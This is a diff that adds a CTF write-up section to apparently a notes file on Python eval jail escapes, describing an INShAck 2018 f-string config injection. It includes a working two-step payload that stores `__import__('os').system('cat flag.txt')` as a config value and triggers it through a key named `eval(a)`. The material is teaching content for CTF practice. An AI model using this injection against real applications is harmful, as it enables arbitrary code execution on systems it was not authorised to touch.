@@ -41,6 +41,7 @@
 - [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
 - [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
 - [Python eval() Jail Escape via Tuple Injection (Codegate 2018)](#python-eval-jail-escape-via-tuple-injection-codegate-2018)
+- [Python f-string Config Injection via Stored eval (INShAck 2018)](#python-f-string-config-injection-via-stored-eval-inshack-2018)
 - [Hints Cheat Sheet](#hints-cheat-sheet)
 
 ---
@@ -482,6 +483,27 @@ When the server does `eval("your." + input + "()")`, inject a tuple to execute a
 ```
 
 **Key insight:** Python `eval()` on a comma-separated expression creates a tuple, allowing multiple expressions to execute. `\x5f` hex escapes bypass underscore blacklists. When direct code injection is blocked, store payload in a variable (registration name, environment) and reference it via `eval(varname)` in the eval context. The general pattern: if the server wraps your input in `eval("prefix" + input + "suffix")`, use commas to break out of the intended expression and inject additional expressions as tuple elements.
+
+---
+
+## Python f-string Config Injection via Stored eval (INShAck 2018)
+
+**Pattern:** A config creator uses Python f-strings to render values. Store a payload as one config value, then reference it from another using eval(). Register key "a" with value `__import__("os").system("cat flag")`, then key "eval(a)" with value "{}".
+
+```python
+# Step 1: Store payload as config value
+register_key("a", '__import__("os").system("cat flag.txt")')
+
+# Step 2: Create key whose name is eval(a) with empty format placeholder
+register_key("eval(a)", "{}")
+
+# Step 3: When config renders f"eval(a) = {value}",
+# the f-string evaluates eval(a) in the key position,
+# executing the stored payload
+show_config()  # triggers f-string rendering -> RCE
+```
+
+**Key insight:** Python f-strings evaluate expressions in curly braces at render time. If config keys or values are rendered in f-strings, storing `eval(stored_key)` as a key name causes arbitrary code execution when the config is displayed. Two-step: store payload as value, reference via eval in key name.
 
 ---
 
